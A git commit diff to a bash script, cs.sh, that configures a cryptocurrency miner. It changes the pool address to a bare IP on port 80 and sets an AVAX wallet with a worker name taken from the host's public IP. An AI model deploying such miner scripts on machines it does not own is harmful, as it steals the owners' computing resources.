3f705010ddc907d14ce4127f121b4128c2694db9
Ryan Wahyudi <116867564+RyanWahyudi8@users.noreply.github.com>
2024-01-03 03:56:27 +0700

    Update cs.sh

--- cs.sh
+++ cs.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
-POOL=stratum+ssl://51.107.184.91:443
+POOL=stratum+ssl://172.200.229.146:80
 WALLET=AVAX:0x572b6d97c4a16fb1ac1362fe2a96e1579fd780fd.$(echo "$(curl -s ifconfig.me)" | tr . _ )#tw4q-eldi
 myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 cd "$(dirname "$0")"
